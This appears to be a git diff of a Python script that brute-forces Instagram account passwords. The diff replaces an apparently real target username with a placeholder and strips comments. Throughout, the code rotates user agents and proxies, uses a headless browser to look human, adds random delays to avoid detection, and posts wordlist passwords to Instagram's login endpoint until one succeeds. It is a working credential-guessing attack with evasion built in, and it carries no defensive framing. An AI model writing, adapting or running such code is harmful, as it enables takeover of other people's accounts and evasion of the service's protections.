@@ -6,8 +6,8 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 
 # Define the user and password file
-username = 'bohmiiiidd'
-password_file = 'pass.txt'
+username = 'username'
+password_file = 'wordlist.txt'
 login_url = 'https://www.instagram.com/accounts/login/'
 
 # List of user agents to rotate
@@ -26,7 +26,6 @@ proxies = [
     # Add more proxies here...
 ]
 
-# Define headers for the requests
 headers = {
     'User-Agent': random.choice(user_agents),
     'X-Requested-With': 'XMLHttpRequest',
@@ -39,10 +38,8 @@ def get_initial_parameters(session):
     response = session.get(login_url, headers=headers)
     soup = BeautifulSoup(response.text, 'html.parser')
     
-    # Extract CSRF token from cookies
     csrf_token = session.cookies.get_dict().get('csrftoken')
 
-    # Check if the CSRF token was successfully extracted
     if not csrf_token:
         print("Failed to retrieve CSRF token.")
         return None
@@ -62,28 +59,22 @@ def mimic_human_behavior(driver, session):
     """ Use a headless browser to simulate user behavior """
     driver.get(login_url)
 
-    # Simulate user actions, like typing username and password, clicking
-    time.sleep(random.uniform(2, 5))  # Random delay before interacting with the page
+    time.sleep(random.uniform(2, 5))  
 
-    # Capture cookies from Selenium and convert them to a format requests can use
     cookies = driver.get_cookies()
     for cookie in cookies:
         session.cookies.set(cookie['name'], cookie['value'])
 
 def brute_force_login(verbose=False):
-    # Create a session to persist cookies and parameters
     session = requests.Session()
 
-    # Get initial parameters such as CSRF token
     csrf_token = get_initial_parameters(session)
     if csrf_token is None:
         print("Could not retrieve initial parameters. Exiting...")
         return
 
-    # Add the CSRF token to the headers
     headers['X-CSRFToken'] = csrf_token
 
-    # Load passwords from the file
     try:
         with open(password_file, 'r') as file:
             passwords = file.read().splitlines()
@@ -91,15 +82,15 @@ def brute_force_login(verbose=False):
         print(f"Password file '{password_file}' not found.")
         return
 
-    # Set up headless browser for mimicking human behavior
+    
     driver = setup_browser()
 
-    # Mimic human behavior to make it look less like a bot
+    
     mimic_human_behavior(driver, session)
 
-    # Loop through each password in the list
+    
     for password in passwords:
-        # Update headers and proxies dynamically
+        
         headers['User-Agent'] = random.choice(user_agents)
         proxy = random.choice(proxies)
         proxy_dict = {
@@ -107,7 +98,7 @@ def brute_force_login(verbose=False):
             "https": proxy,
         }
 
-        # Prepare the login data (username and password)
+       
         login_data = {
             'username': username,
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
@@ -115,25 +106,25 @@ def brute_force_login(verbose=False):
             'optIntoOneTap': 'false',
         }
 
-        # Random delay between requests to avoid detection
+        
         delay = random.uniform(1, 5)
         time.sleep(delay)
 
-        # Send the POST request to the login page with the data and headers
+        
         try:
             response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers, proxies=proxy_dict)
         except requests.RequestException as e:
             print(f"Request failed: {e}")
             continue
 
-        # Verbose mode: print link state and response pattern for each attempt
+        
         if verbose:
             print(f"[*] Trying password: {password}")
             print(f"URL: {response.url}")
             print(f"Status Code: {response.status_code}")
             print(f"Response Length: {len(response.text)} characters")
 
-        # Check the response to see if the login was successful
+        
         if 'userId' in response.text:
             print(f'[+] Password found: {password}')
             print(f'Page URL: {response.url}')
@@ -149,10 +140,7 @@ def brute_force_login(verbose=False):
 
     print('[-] Brute-force attack finished. No valid password found.')
 
-    # Close the browser after brute-force attempts
     driver.quit()
 
-# Call the brute-force function
 if __name__ == "__main__":
-    # Set verbose to True to enable printing of patterns
     brute_force_login(verbose=True)
